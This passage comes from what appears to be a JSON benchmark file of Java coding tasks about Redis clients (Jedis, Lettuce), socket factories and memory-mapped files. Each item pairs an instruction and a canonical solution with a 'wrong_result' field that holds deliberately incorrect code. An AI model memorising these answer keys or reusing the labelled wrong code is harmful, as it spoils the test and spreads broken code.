JedisClusterOperationException maxAttemptsException\n        = new JedisClusterOperationException(\"No more cluster attempts left.\");\n    maxAttemptsException.addSuppressed(lastException);\n    throw maxAttemptsException;\n  }\n\n  protected <T> T execute(Connection connection, CommandObject<T> commandObject) {\n    return connection.executeCommand(commandObject);\n  }\n\n  private boolean handleConnectionProblem(int attemptsLeft, int consecutiveConnectionFailures, Instant doneDeadline) {\n    if (this.maxAttempts < 3) {\n      if (attemptsLeft == 0) {\n        provider.renewSlotCache();\n        return true;\n      }\n      return false;\n    }\n\n    if (consecutiveConnectionFailures < 2) {\n      return false;\n    }\n\n    sleep(getBackoffSleepMillis(attemptsLeft, doneDeadline));\n    provider.renewSlotCache();\n    return true;\n  }\n\n  private static long getBackoffSleepMillis(int attemptsLeft, Instant deadline) {\n    if (attemptsLeft <= 0) {\n      return 0;\n    }\n\n    long millisLeft = Duration.between(Instant.now(), deadline).toMillis();\n    if (millisLeft < 0) {\n      throw new JedisClusterOperationException(\"Cluster retry deadline exceeded.\");\n    }\n\n    long maxBackOff = millisLeft / (attemptsLeft * attemptsLeft);\n    return ThreadLocalRandom.current().nextLong(maxBackOff + 1);\n  }\n\n  protected void sleep(long sleepMillis) {\n    try {\n      TimeUnit.MILLISECONDS.sleep(sleepMillis);\n    } catch (InterruptedException e) {\n      throw new JedisClusterOperationException(e);\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport io.lettuce.core.RedisException;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport java.time.Duration;\nimport java.time.Instant;\nimport java.util.concurrent.ThreadLocalRandom;\nimport org.slf4j.Logger;\n\npublic class ClusterCommandExecutor<T> {\n    private final ClusterConnectionProvider provider;\n    private final int maxAttempts;\n    private final Duration maxTotalRetriesDuration;\n    private final Logger log;\n\n    public ClusterCommandExecutor(ClusterConnectionProvider provider, int maxAttempts, Duration maxTotalRetriesDuration, Logger log) {\n        this.provider = provider;\n        this.maxAttempts = maxAttempts;\n        this.maxTotalRetriesDuration = maxTotalRetriesDuration;\n        this.log = log;\n    }\n\n    public void close() {\n        provider.close();\n    }\n\n    public T broadcastCommand(CommandObject<T> commandObject) {\n        return executeCommand(commandObject);\n    }\n\n    public T executeCommand(CommandObject<T> commandObject) {\n        return doExecuteCommand(commandObject, false);\n    }\n\n    public T executeCommandToReplica(CommandObject<T> commandObject) {\n        return doExecuteCommand(commandObject, true);\n    }\n\n    private T doExecuteCommand(CommandObject<T> commandObject, boolean toReplica) {\n        Instant deadline = Instant.now().plus(maxTotalRetriesDuration);\n        int attemptsLeft = maxAttempts;\n        int consecutiveConnectionFailures = 0;\n\n        while (attemptsLeft > 0) {\n            try {\n                StatefulRedisConnection connection = toReplica ? provider.getReplicaConnection() : provider.getPrimaryConnection();\n                T result = execute(connection, commandObject);\n                if (consecutiveConnectionFailures > 0) {\n                    provider.renewSlotCache();\n                }\n                return result;\n            } catch (RedisException e) {\n                if (!handleConnectionProblem(attemptsLeft, consecutiveConnectionFailures, deadline)) {\n                    throw e;\n                }\n                consecutiveConnectionFailures++;\n                attemptsLeft--;\n                long sleepMillis = getBackoffSleepMillis(attemptsLeft, deadline);\n                sleep(sleepMillis);\n            }\n        }\n\n        throw new RedisException(\"Failed to execute command after \" + maxAttempts + \" attempts\");\n    }\n\n    private T execute(StatefulRedisConnection connection, CommandObject<T> commandObject) {\n        return commandObject.execute(connection);\n    }\n\n    private boolean handleConnectionProblem(int attemptsLeft, int consecutiveConnectionFailures, Instant doneDeadline) {\n        if (attemptsLeft == 0 || Instant.now().isAfter(doneDeadline)) {\n            return false;\n        }\n\n        if (consecutiveConnectionFailures >= 3) {\n            provider.renewSlotCache();\n        }\n\n        return true;\n    }\n\n    private long getBackoffSleepMillis(int attemptsLeft, Instant deadline) {\n        long jitter = ThreadLocalRandom.current().nextLong(100);\n        long baseDelay = (long) Math.pow(2, maxAttempts - attemptsLeft) * 100;\n        long sleepTime = baseDelay + jitter;\n        long remainingTime = Duration.between(Instant.now(), deadline).toMillis();\n\n        return Math.min(sleepTime, remainingTime);\n    }\n\n    private void sleep(long sleepMillis) {\n        try {\n            Thread.sleep(sleepMillis);\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 322,
    "Instruction": "Task Description: Implement a Redis data access object (DAO) class in Java that provides functionality for caching and retrieving Seckill objects using Redis as the storage backend. The class should handle connection management, serialization/deserialization, and implement a cache-aside pattern with distributed locking.\n\nClass Description: RedisDao is a Java class that interacts with Redis to store and retrieve Seckill objects. It uses Jedis as the Redis client, Protostuff for serialization, and implements distributed locking for thread-safe operations.\n\nAttributes:\n- jedisPool: JedisPool - The connection pool for Redis connections\n- schema: RuntimeSchema<Seckill> - The Protostuff schema for Seckill object serialization\n\nMethods:\n- RedisDao(String ip, int port) -> void - Constructor that initializes the JedisPool with given Redis server IP and port\n- getSeckill(long seckillId) -> Seckill - Retrieves a Seckill object from Redis by its ID\n- getSeckill(long seckillId, Jedis jedis) -> Seckill - Retrieves a Seckill object from Redis using an existing Jedis connection\n- getOrPutSeckill(long seckillId, Function<Long, Seckill> getDataFromDb) -> Seckill - Implements cache-aside pattern with distributed locking, fetching from DB if not in cache\n- putSeckill(Seckill seckill) -> String - Stores a Seckill object in Redis with default expiration\n- putSeckill(Seckill seckill, Jedis jedis) -> String - Stores a Seckill object in Redis using an existing Jedis connection\n- getSeckillRedisKey(long seckillId) -> String - Helper method to generate Redis key for a Seckill object",
    "Canonical_solution": "import cn.codingxiaxw.entity.Seckill;\nimport cn.codingxiaxw.utils.JedisUtils;\nimport com.dyuproject.protostuff.LinkedBuffer;\nimport com.dyuproject.protostuff.ProtostuffIOUtil;\nimport com.dyuproject.protostuff.runtime.RuntimeSchema;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\n\nimport java.util.UUID;\nimport java.util.function.Function;\n\npublic class RedisDao {\n    private final JedisPool jedisPool;\n    private RuntimeSchema<Seckill> schema = RuntimeSchema.createFrom(Seckill.class);\n\n    public RedisDao(String ip, int port) {\n        jedisPool = new JedisPool(ip, port);\n    }\n\n    public Seckill getSeckill(long seckillId) {\n        return getSeckill(seckillId, null);\n    }\n\n    public Seckill getSeckill(long seckillId, Jedis jedis) {\n        boolean hasJedis = jedis != null;\n        try {\n            if (!hasJedis) {\n                jedis = jedisPool.getResource();\n            }\n            try {\n                String key = getSeckillRedisKey(seckillId);\n                byte[] bytes = jedis.get(key.getBytes());\n                if (bytes != null) {\n                    Seckill seckill = schema.newMessage();\n                    ProtostuffIOUtil.mergeFrom(bytes, seckill, schema);\n                    return seckill;\n                }\n            } finally {\n                if (!hasJedis) {\n                    jedis.close();\n                }\n            }\n        } catch (Exception e) {\n        }\n        return null;\n    }\n\n    public Seckill getOrPutSeckill(long seckillId, Function<Long, Seckill> getDataFromDb) {\n        String lockKey = \"seckill:locks:getSeckill:\" + seckillId;\n        String lockRequestId = UUID.randomUUID().toString();\n        Jedis jedis = jedisPool.getResource();\n\n        try {\n            while (true) {\n                Seckill seckill = getSeckill(seckillId, jedis);\n                if (seckill != null) {\n                    return seckill;\n                }\n                boolean getLock = JedisUtils.tryGetDistributedLock(jedis, lockKey, lockRequestId, 1000);\n                if (getLock) {\n                    seckill = getDataFromDb.apply(seckillId);\n                    putSeckill(seckill, jedis);\n                    return seckill;\n                }\n                try {\n                    Thread.sleep(100);\n                } catch (InterruptedException ignored) {\n                }\n            }\n        } catch (Exception ignored) {\n        } finally {\n            JedisUtils.releaseDistributedLock(jedis, lockKey, lockRequestId);\n            jedis.close();\n        }\n        return null;\n    }\n\n    public String putSeckill(Seckill seckill) {\n        return putSeckill(seckill, null);\n    }\n\n    public String putSeckill(Seckill seckill, Jedis jedis) {\n        boolean hasJedis = jedis != null;\n        try {\n            if (!hasJedis) {\n                jedis = jedisPool.getResource();\n            }\n            try {\n                String key = getSeckillRedisKey(seckill.getSeckillId());\n                byte[] bytes = ProtostuffIOUtil.toByteArray(seckill, schema,\n                        LinkedBuffer.allocate(LinkedBuffer.DEFAULT_BUFFER_SIZE));\n                int timeout = 60 * 60;\n                return jedis.setex(key.getBytes(), timeout, bytes);\n            } finally {\n                if (!hasJedis) {\n                    jedis.close();\n                }\n            }\n        } catch (Exception e) {\n        }\n        return null;\n    }\n\n    private String getSeckillRedisKey(long seckillId) {\n        return \"seckill:\" + seckillId;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport io.protostuff.LinkedBuffer;\nimport io.protostuff.ProtostuffIOUtil;\nimport io.protostuff.Schema;\nimport io.protostuff.runtime.RuntimeSchema;\n\npublic class RedisDao {\n    private final JedisPool jedisPool;\n    private final Schema<Seckill> schema = RuntimeSchema.getSchema(Seckill.class);\n\n    public RedisDao(String ip, int port) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, ip, port);\n    }\n\n    public Seckill getSeckill(long seckillId) {\n        try (Jedis jedis = jedisPool.getResource()) {\n            return getSeckill(seckillId, jedis);\n        }\n    }\n\n    public Seckill getSeckill(long seckillId, Jedis jedis) {\n        byte[] key = getSeckillRedisKey(seckillId).getBytes();\n        byte[] bytes = jedis.get(key);\n        if (bytes != null && bytes.length > 0) {\n            Seckill seckill = schema.newMessage();\n            ProtostuffIOUtil.mergeFrom(bytes, seckill, schema);\n            return seckill;\n        }\n        return null;\n    }\n\n    public Seckill getOrPutSeckill(long seckillId, java.util.function.Function<Long, Seckill> getDataFromDb) {\n        String lockKey = \"lock:seckill:\" + seckillId;\n        String requestId = java.util.UUID.randomUUID().toString();\n\n        try (Jedis jedis = jedisPool.getResource()) {\n            long expireTime = 3000; // Lock expires in 3 seconds\n            Long locked = jedis.setnx(lockKey.getBytes(), requestId.getBytes());\n            if (locked == 1 || expireTime < System.currentTimeMillis() - getLockRemainingTime(jedis, lockKey)) {\n                jedis.expire(lockKey, 3); // Set expiration to prevent deadlocks\n\n                Seckill seckill = getSeckill(seckillId, jedis);\n                if (seckill == null) {\n                    seckill = getDataFromDb.apply(seckillId);\n                    putSeckill(seckill, jedis);\n                }\n                return seckill;\n            } else {\n                Thread.sleep(50); // Wait before retrying\n                return getOrPutSeckill(seckillId, getDataFromDb);\n            }\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        } finally {\n            releaseLock(jedisPool.getResource(), lockKey, requestId);\n        }\n    }\n\n    private void releaseLock(Jedis jedis, String lockKey, String requestId) {\n        String script =\n            \"if redis.call('get', KEYS[1]) == ARGV[1] then \"\n            + \"return redis.call('del', KEYS[1]) \"\n            + \"else return 0 end\";\n        jedis.eval(script, 1, lockKey.getBytes(), requestId.getBytes());\n    }\n\n    private long getLockRemainingTime(Jedis jedis, String lockKey) {\n        return jedis.pttl(lockKey);\n    }\n\n    public String putSeckill(Seckill seckill) {\n        try (Jedis jedis = jedisPool.getResource()) {\n            return putSeckill(seckill, jedis);\n        }\n    }\n\n    public String putSeckill(Seckill seckill, Jedis jedis) {\n        byte[] key = getSeckillRedisKey(seckill.getSeckillId()).getBytes();\n        byte[] bytes = LinkedBuffer.allocate(LinkedBuffer.DEFAULT_BUFFER_SIZE).writeObject(seckill, schema);\n        String result = jedis.setex(key, 60 * 60, bytes);\n        return result;\n    }\n\n    public String getSeckillRedisKey(long seckillId) {\n        return \"seckill:\" + seckillId;\n    }\n}\n```"
  },
  {
    "Task_id": 323,
    "Instruction": "Task Description: Create a Java class that implements a socket factory for establishing connections to Redis servers, supporting both regular and SSL/TLS connections with configurable timeouts and hostname verification.\n\nClass Description: DefaultJedisSocketFactory is a socket factory implementation for Redis client connections that handles both plain and SSL/TLS sockets, with support for connection timeouts, socket timeouts, host shuffling, and hostname verification.\n\nAttributes:\n- hostAndPort: HostAndPort - The Redis server address and port\n- connectionTimeout: int - Connection timeout in milliseconds\n- socketTimeout: int - Socket timeout in milliseconds\n- ssl: boolean - Flag indicating whether to use SSL/TLS\n- sslSocketFactory: SSLSocketFactory - Factory for creating SSL sockets\n- sslParameters: SSLParameters - SSL/TLS parameters\n- hostnameVerifier: HostnameVerifier - Hostname verifier for SSL/TLS\n- hostAndPortMapper: HostAndPortMapper - Mapper for host and port addresses\n\nMethods:\n- DefaultJedisSocketFactory() -> void - Default constructor using default host and port\n- DefaultJedisSocketFactory(HostAndPort hostAndPort) -> void - Constructor with specified host and port\n- DefaultJedisSocketFactory(JedisClientConfig config) -> void - Constructor with client configuration\n- DefaultJedisSocketFactory(HostAndPort hostAndPort, JedisClientConfig config) -> void - Constructor with both host/port and configuration\n- connectToFirstSuccessfulHost(HostAndPort hostAndPort) -> Socket - Internal method to establish connection to first available host\n- createSocket() -> Socket - Creates and returns a configured socket (plain or SSL) to Redis server\n- getSocketHostAndPort() -> HostAndPort - Returns the effective host and port after applying any mapping",
    "Canonical_solution": "import java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.util.Arrays;\nimport java.util.Collections;\nimport java.util.List;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.SSLParameters;\nimport javax.net.ssl.SSLSocket;\nimport javax.net.ssl.SSLSocketFactory;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.util.IOUtils;\n\npublic class DefaultJedisSocketFactory implements JedisSocketFactory {\n\n  protected static final HostAndPort DEFAULT_HOST_AND_PORT = new HostAndPort(Protocol.DEFAULT_HOST,\n      Protocol.DEFAULT_PORT);\n\n  private volatile HostAndPort hostAndPort = DEFAULT_HOST_AND_PORT;\n  private int connectionTimeout = Protocol.DEFAULT_TIMEOUT;\n  private int socketTimeout = Protocol.DEFAULT_TIMEOUT;\n  private boolean ssl = false;\n  private SSLSocketFactory sslSocketFactory = null;\n  private SSLParameters sslParameters = null;\n  private HostnameVerifier hostnameVerifier = null;\n  private HostAndPortMapper hostAndPortMapper = null;\n\n  public DefaultJedisSocketFactory() {\n  }\n\n  public DefaultJedisSocketFactory(HostAndPort hostAndPort) {\n    this(hostAndPort, null);\n  }\n\n  public DefaultJedisSocketFactory(JedisClientConfig config) {\n    this(null, config);\n  }\n\n  public DefaultJedisSocketFactory(HostAndPort hostAndPort, JedisClientConfig config) {\n    if (hostAndPort != null) {\n      this.hostAndPort = hostAndPort;\n    }\n    if (config != null) {\n      this.connectionTimeout = config.getConnectionTimeoutMillis();\n      this.socketTimeout = config.getSocketTimeoutMillis();\n      this.ssl = config.isSsl();\n      this.sslSocketFactory = config.getSslSocketFactory();\n      this.sslParameters = config.getSslParameters();\n      this.hostnameVerifier = config.getHostnameVerifier();\n      this.hostAndPortMapper = config.getHostAndPortMapper();\n    }\n  }\n\n  private Socket connectToFirstSuccessfulHost(HostAndPort hostAndPort) throws Exception {\n    List<InetAddress> hosts = Arrays.asList(InetAddress.getAllByName(hostAndPort.getHost()));\n    if (hosts.size() > 1) {\n      Collections.shuffle(hosts);\n    }\n\n    JedisConnectionException jce = new JedisConnectionException(\"Failed to connect to \" + hostAndPort + \".\");\n    for (InetAddress host : hosts) {\n      try {\n        Socket socket = new Socket();\n\n        socket.setReuseAddress(true);\n        socket.setKeepAlive(true);\n        socket.setTcpNoDelay(true);\n        socket.setSoLinger(true, 0);\n\n        socket.connect(new InetSocketAddress(host, hostAndPort.getPort()), connectionTimeout);\n        return socket;\n      } catch (Exception e) {\n        jce.addSuppressed(e);\n      }\n    }\n    throw jce;\n  }\n\n  @Override\n  public Socket createSocket() throws JedisConnectionException {\n    Socket socket = null;\n    try {\n      HostAndPort _hostAndPort = getSocketHostAndPort();\n      socket = connectToFirstSuccessfulHost(_hostAndPort);\n      socket.setSoTimeout(socketTimeout);\n\n      if (ssl) {\n        SSLSocketFactory _sslSocketFactory = this.sslSocketFactory;\n        if (null == _sslSocketFactory) {\n          _sslSocketFactory = (SSLSocketFactory) SSLSocketFactory.getDefault();\n        }\n        Socket plainSocket = socket;\n        socket = _sslSocketFactory.createSocket(socket, _hostAndPort.getHost(), _hostAndPort.getPort(), true);\n\n        if (null != sslParameters) {\n          ((SSLSocket) socket).setSSLParameters(sslParameters);\n        }\n        socket = new SSLSocketWrapper((SSLSocket) socket, plainSocket);\n\n        if (null != hostnameVerifier\n            && !hostnameVerifier.verify(_hostAndPort.getHost(), ((SSLSocket) socket).getSession())) {\n          String message = String.format(\n            \"The connection to '%s' failed ssl/tls hostname verification.\", _hostAndPort.getHost());\n          throw new JedisConnectionException(message);\n        }\n      }\n\n      return socket;\n\n    } catch (Exception ex) {\n      IOUtils.closeQuietly(socket);\n      if (ex instanceof JedisConnectionException) {\n        throw (JedisConnectionException) ex;\n      } else {\n        throw new JedisConnectionException(\"Failed to create socket.\", ex);\n      }\n    }\n  }\n\n  protected HostAndPort getSocketHostAndPort() {\n    HostAndPortMapper mapper = hostAndPortMapper;\n    HostAndPort hap = this.hostAndPort;\n    if (mapper != null) {\n      HostAndPort mapped = mapper.getHostAndPort(hap);\n      if (mapped != null) {\n        return mapped;\n      }\n    }\n    return hap;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.List;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.SSLParameters;\nimport javax.net.ssl.SSLSocketFactory;\n\npublic class DefaultJedisSocketFactory {\n    private final HostAndPort hostAndPort;\n    private final int connectionTimeout;\n    private final int socketTimeout;\n    private final boolean ssl;\n    private final SSLSocketFactory sslSocketFactory;\n    private final SSLParameters sslParameters;\n    private final HostnameVerifier hostnameVerifier;\n    private final HostAndPortMapper hostAndPortMapper;\n\n    public DefaultJedisSocketFactory() {\n        this(HostAndPort.create(\"127.0.0.1\", 6379));\n    }\n\n    public DefaultJedisSocketFactory(HostAndPort hostAndPort) {\n        this(hostAndPort, JedisClientConfig.builder().build());\n    }\n\n    public DefaultJedisSocketFactory(JedisClientConfig config) {\n        this(HostAndPort.create(\"127.0.0.1\", 6379), config);\n    }\n\n    public DefaultJedisSocketFactory(HostAndPort hostAndPort, JedisClientConfig config) {\n        this.hostAndPort = hostAndPort;\n        this.connectionTimeout = config.getConnectionTimeoutMillis();\n        this.socketTimeout = config.getSocketTimeoutMillis();\n        this.ssl = config.isSSL();\n        this.sslSocketFactory = config.getSslSocketFactory();\n        this.sslParameters = config.getSslParameters();\n        this.hostnameVerifier = config.getHostnameVerifier();\n        this.hostAndPortMapper = config.getHostAndPortMapper();\n    }\n\n    protected Socket connectToFirstSuccessfulHost(HostAndPort hostAndPort) throws IOException {\n        List<InetSocketAddress> addresses = new ArrayList<>();\n        for (InetSocketAddress address : resolveAddress(hostAndPort)) {\n            addresses.add(address);\n        }\n        if (addresses.isEmpty()) {\n            throw new UnknownHostException(\"Cannot resolve \" + hostAndPort);\n        }\n\n        Collections.shuffle(addresses);\n\n        IOException lastException = null;\n        for (InetSocketAddress address : addresses) {\n            try {\n                return createSocketInternal(address);\n            } catch (IOException e) {\n                lastException = e;\n            }\n        }\n        throw lastException;\n    }\n\n    public Socket createSocket() throws IOException {\n        return connectToFirstSuccessfulHost(getSocketHostAndPort());\n    }\n\n    public HostAndPort getSocketHostAndPort() {\n        HostAndPort mapped = hostAndPortMapper.map(hostAndPort);\n        return mapped != null ? mapped : hostAndPort;\n    }\n\n    private List<InetSocketAddress> resolveAddress(HostAndPort hostAndPort) {\n        // Implement resolution logic based on your needs\n        InetSocketAddress address = new InetSocketAddress(hostAndPort.getHost(), hostAndPort.getPort());\n        List<InetSocketAddress> result = new ArrayList<>();\n        result.add(address);\n        return result;\n    }\n\n    private Socket createSocketInternal(InetSocketAddress address) throws IOException {\n        Socket socket;\n        if (ssl) {\n            socket = sslSocketFactory.createSocket();\n            ((SSLSocket) socket).setEnabledProtocols(sslParameters.getProtocols());\n            ((SSLSocket) socket).setEnabledCipherSuites(sslParameters.getCipherSuites());\n            ((SSLSocket) socket).setUseClientMode(true);\n            ((SSLSocket) socket).setNeedClientAuth(false);\n        } else {\n            socket = new Socket();\n        }\n\n        socket.setReuseAddress(true);\n        socket.setSoTimeout(socketTimeout);\n        socket.connect(address, connectionTimeout);\n\n        if (ssl && hostnameVerifier != null) {\n            String host = address.getHostName();\n            int port = address.getPort();\n            if (!hostnameVerifier.verify(host, ((SSLSocket) socket).getSession())) {\n                throw new IOException(\"Hostname verification failed for \" + host + \":\" + port);\n            }\n        }\n\n        return socket;\n    }\n}\n```"
  },
  {
    "Task_id": 33,
    "Instruction": "Task Description: Create a Java class that utilizes Java NIO's FileChannel to map a file into memory for read-only access, providing methods to access the mapped memory address and file size, and properly closing the channel when done.\n\nClass Description: The FileChannelProcessor class provides functionality to open a file using FileChannel, map it into memory in read-only mode, and expose the memory address and file size. It ensures proper resource cleanup by implementing a close method.\n\nAttributes:\nfileChannel: FileChannel - The FileChannel instance used for file operations\nmappedAddress: long - The memory address where the file is mapped\nfileSize: long - The size of the mapped file in bytes\n\nMethods:\nFileChannelProcessor: [Constructor](String filePath) throws IOException - Initializes the FileChannel, maps the file into memory in read-only mode, and stores the memory address and file size\ngetMappedAddress: () -> long - Returns the memory address where the file is mapped\ngetFileSize: () -> long - Returns the size of the mapped file\nclose: () throws IOException - Closes the FileChannel to release system resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.lang.foreign.Arena;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.FileChannel.MapMode;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelProcessor {\n    private FileChannel fileChannel;\n    private long mappedAddress;\n    private long fileSize;\n\n    public FileChannelProcessor(String filePath) throws IOException {\n        this.fileChannel = FileChannel.open(Path.of(filePath), StandardOpenOption.READ);\n        this.fileSize = fileChannel.size();\n        this.mappedAddress = fileChannel.map(MapMode.READ_ONLY, 0, fileSize, Arena.global()).address();\n    }\n\n    public long getMappedAddress() {\n        return mappedAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.io.RandomAccessFile;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\n\npublic class FileChannelProcessor {\n    private final FileChannel fileChannel;\n    private final long mappedAddress;\n    private final long fileSize;\n\n    public FileChannelProcessor(String filePath) throws IOException {\n        RandomAccessFile file = new RandomAccessFile(filePath, \"r\");\n        this.fileChannel = file.getChannel();\n        this.fileSize = this.fileChannel.size();\n\n        MappedByteBuffer buffer = this.fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, this.fileSize);\n        this.mappedAddress = ((sun.nio.ch.DirectBuffer) buffer).address();\n    }\n\n    public long getMappedAddress() {\n        return mappedAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        if (fileChannel != null) {\n            fileChannel.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 330,
    "Instruction": "Task Description: Implement a Java class for interacting with Redis using the Lettuce client, including connection management and data operations.\n\nClass Description: The RedisInteraction class provides functionality to establish and manage a connection to a Redis server, perform bulk data operations, and clean up resources. It uses the Lettuce client library for Redis interactions.\n\nAttributes:\n- client: RedisClient - The Redis client instance used to create connections\n- connection: StatefulRedisConnection<String, String> - The active connection to the Redis server\n\nMethods:\n- initializeConnection() -> void - Initializes the Redis client and establishes a connection to the Redis server. Also clears all existing data in Redis.\n- closeConnection() -> void - Closes the Redis connection and shuts down the client to release resources.\n- createRedisPublisher(long elements) -> Publisher<String> - Creates and returns a Publisher that streams Redis keys. Populates Redis with test data (number of elements specified by input parameter) before creating the publisher. Returns null if elements equals Long.MAX_VALUE.",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.ScanStream;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport io.lettuce.test.resource.FastShutdown;\nimport io.lettuce.test.resource.TestClientResources;\nimport io.lettuce.test.settings.TestSettings;\nimport org.reactivestreams.Publisher;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class RedisInteraction {\n\n    private RedisClient client;\n    private StatefulRedisConnection<String, String> connection;\n\n    public void initializeConnection() {\n        client = RedisClient.create(TestClientResources.get(), RedisURI.create(TestSettings.host(), TestSettings.port()));\n        connection = client.connect();\n        connection.sync().flushall();\n    }\n\n    public void closeConnection() {\n        connection.close();\n        FastShutdown.shutdown(client);\n    }\n\n    public Publisher<String> createRedisPublisher(long elements) {\n        RedisCommands<String, String> sync = connection.sync();\n        sync.flushall();\n\n        if (elements == Long.MAX_VALUE) {\n            return null;\n        }\n\n        Map<String, String> map = new HashMap<>();\n        for (int i = 0; i < elements; i++) {\n            String element = \"RedisInteraction-\" + i;\n            map.put(element, element);\n\n            if (i % 1000 - 2020 == 0 && !map.isEmpty()) {\n                sync.mset(map);\n                map.clear();\n            }\n        }\n\n        if (!map.isEmpty()) {\n            sync.mset(map);\n            map.clear();\n        }\n\n        return ScanStream.scan(connection.reactive());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport io.lettuce.core.*;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\nimport reactor.core.publisher.Flux;\n\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class RedisInteraction {\n    private RedisClient client;\n    private StatefulRedisConnection<String, String> connection;\n\n    public void initializeConnection() {\n        client = RedisClient.create(\"redis://127.0.0.1:6379\");\n        connection = client.connect();\n        RedisCommands<String, String> commands = connection.sync();\n        commands.flushall();\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (client != null) {\n            client.shutdown();\n        }\n    }\n\n    public Publisher<String> createRedisPublisher(long elements) {\n        if (elements == Long.MAX_VALUE) {\n            return null;\n        }\n\n        RedisCommands<String, String> commands = connection.sync();\n        for (long i = 0; i < elements; i++) {\n            commands.set(\"key_\" + i, \"value_\" + i);\n        }\n\n        final AtomicLong counter = new AtomicLong(0);\n        return Flux.generate(sink -> {\n            long index = counter.getAndIncrement();\n            if (index < elements) {\n                sink.next(\"key_\" + index);\n            } else {\n                sink.complete();\n            }\n        });\n    }\n}\n```"
  },
  {
    "Task_id": 331,
    "Instruction": "Task Description: Implement a multi-cluster Redis connection provider that manages connections to multiple Redis clusters with failover capabilities and connection pooling.\n\nClass Description: MultiClusterPooledConnectionProvider is a connection provider that maintains connections to multiple Redis clusters, allowing for cluster failover and providing pooled connections to improve performance. It uses a priority-based system to determine the active cluster and provides thread-safe access to connections.\n\nAttributes:\n- log: Logger - Logger instance for logging events and errors\n- multiClusterMap: Map<Integer, Cluster> - Concurrent map storing Redis clusters with their priority as key\n- activeMultiClusterIndex: Integer - Currently active cluster index (volatile for thread visibility)\n- activeClusterIndexLock: Lock - Reentrant lock for thread-safe modification of active cluster index\n- lastClusterCircuitBreakerForcedOpen: boolean - Flag indicating if circuit breaker was last forced open (volatile for thread visibility)\n\nMethods:\n- MultiClusterPooledConnectionProvider(MultiClusterClientConfig) -> void - Constructor that initializes the connection pools for all configured Redis clusters\n  Input: multiClusterClientConfig - Configuration object containing cluster settings\n  Throws: JedisValidationException if config is null\n\n- getConnection() -> Connection - Gets a connection from the currently active Redis cluster\n  Output: Connection object from the active cluster's pool\n\n- getConnection(int) -> Connection - Gets a connection from a specific Redis cluster by index\n  Input: multiClusterIndex - Priority index of the desired cluster\n  Output: Connection object from the specified cluster's pool\n\n- close() -> void - Closes the connection pool of the currently active cluster\n\nNested Class: Cluster\n- connectionPool: ConnectionPool - Pool of Redis connections for a specific cluster\n- getConnection() -> Connection - Gets a connection from this cluster's pool\n- getConnectionPool() -> ConnectionPool - Returns the connection pool instance",
    "Canonical_solution": "import io.github.resilience4j.circuitbreaker.CircuitBreaker;\nimport io.github.resilience4j.circuitbreaker.CircuitBreaker.State;\nimport io.github.resilience4j.retry.Retry;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisValidationException;\nimport redis.clients.jedis.util.Pool;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class MultiClusterPooledConnectionProvider implements ConnectionProvider {\n\n    private final Logger log = LoggerFactory.getLogger(getClass());\n    private final Map<Integer, Cluster> multiClusterMap = new ConcurrentHashMap<>();\n    private volatile Integer activeMultiClusterIndex = 1;\n    private final Lock activeClusterIndexLock = new ReentrantLock(true);\n    private volatile boolean lastClusterCircuitBreakerForcedOpen = false;\n\n    public MultiClusterPooledConnectionProvider(MultiClusterClientConfig multiClusterClientConfig) {\n        if (multiClusterClientConfig == null)\n            throw new JedisValidationException(\"MultiClusterClientConfig must not be NULL for MultiClusterPooledConnectionProvider\");\n\n        ClusterConfig[] clusterConfigs = multiClusterClientConfig.getClusterConfigs();\n        for (ClusterConfig config : clusterConfigs) {\n            GenericObjectPoolConfig<Connection> poolConfig = config.getConnectionPoolConfig();\n            String clusterId = 